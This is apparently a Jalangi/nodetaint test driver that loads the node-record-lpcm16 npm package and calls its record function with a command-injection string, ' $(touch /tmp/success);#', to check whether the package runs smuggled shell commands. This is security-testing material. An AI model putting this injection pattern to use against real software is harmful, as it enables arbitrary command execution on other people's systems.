// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/node-record-lpcm16/node_modules/node-record-lpcm16');
try {
	var x0 = {"args":{"args":{"args":" $(touch /tmp/success);#"}}};
PUT["record"](x0)();
} catch (e) {
	console.log(e);
}